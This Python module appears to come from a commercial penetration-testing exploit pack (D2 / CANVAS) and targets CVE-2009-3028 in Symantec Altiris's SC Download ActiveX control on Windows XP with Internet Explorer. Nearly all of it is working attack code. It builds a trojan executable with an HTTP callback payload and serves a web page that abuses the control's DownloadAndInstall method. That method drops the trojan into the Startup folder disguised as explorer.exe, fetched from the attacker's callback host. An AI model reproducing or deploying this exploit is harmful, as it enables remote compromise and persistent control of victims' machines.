#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from MOSDEF import pelib

import struct


# GUI info
NAME = "Symantec Altiris eXpress NS SC Download ActiveX Arbitrary File Download Vulnerability"

DESCRIPTION = "Arbitrary File Download Vulnerability in Symantec Altiris eXpress NS SC Download ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Symantec"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Date public"] = "2009.09.10"
DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/36346"
DOCUMENTATION["Versions Affected"] = "Symantec Altiris Notification Server 6.0"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2009-3028"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3028"
DOCUMENTATION["Notes"] = ""

VERSION = "1.0"

GTK2_DIALOG = "dialog.glade2"

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_altirisns -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
  def __init__(self):
    tcpexploit.__init__(self)
    httpclientside.__init__(self)
    self.clientversion = 1
    self.name = NAME
    self.trojanname = "index.php" 
    self.filename = "index.html"
    return

  def maketrojan(self):
    proxy_payload = ''

    try:
      if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
        # make sure that fromcreatethread is set to 0 in your
        # httpserver/exploit listenerArgsDict!
        import shellcode.standalone.windows.payloads as payloads
        ssl_dict = { True : 'https', False : 'http' }
        print "XXX: self.useSSL ..." + str(self.useSSL)
        p   = payloads.payloads()
        sc  = p.http_proxy("%s://%s" %  (ssl_dict[self.useSSL], self.callback.ip), self.callback.port)
        proxy_payload = p.assemble(sc)
    except Exception,msg:
      import traceback
      traceback.print_exc(file=sys.stderr)
      proxy_payload = ''
            
    myPElib = pelib.PElib()
    
    self.mosdeftrojan = myPElib.createPEFileBuf(proxy_payload)
    
    self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
        
    file(self.trojanname, "wb").write(self.mosdeftrojan)
    self.setInfo("%s - done" % (NAME))
    ret = len(self.mosdeftrojan) != 0
		
    return ret
     
     
  def makefile(self):
  
    filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var detect = new ActiveXObject("Altiris.AeXNSPkgDL.1");
	
	if (detect) {	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:63716E93-033D-48B0-8A2F-8E8473FD7AC7' id='target'></object>";	
			    
    target.DownloadAndInstall("MOSDEFTROJANURL", "C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\explorer.exe", "C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\explorer.exe", "", "");		
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""        
    filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojanname)            
    return filedata

  def makesploit(self, clientheader, clientbody):        
    from libs.spkproxy import header, body
    h = header('SERVER')
    b = body()
    
    self.maketrojan()
    
    if clientheader.URL.count(self.filename):
      self.createShellcode()
      sploitstring = self.makefile()            
      b.setBody(sploitstring)
    elif self.trojanname in clientheader.URL.lower():
      self.log("Sending MOSDEF trojan")
      f = open(self.trojanname, "rb")
      sploitstring = f.read()
      f.close()
      os.remove(self.trojanname)
      self.log("Sending %d bytes"%len(sploitstring))
      h.addHeader("Content-type","binary/octet-stream")
      h.addHeader("Connection","close")
      b.setBody(sploitstring)      
    else:
      self.log('Redirecting to self')
      h.status = '302'
      h.addHeader('Location', self.filename)
      h.addHeader('Content-Type', 'binary/octet-stream')
    return h, b

  def neededListenerTypes(self):
    from canvasengine import HTTPMOSDEF
    return [HTTPMOSDEF]
    
  def run(self):        
    return 1

if __name__=='__main__':
  print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
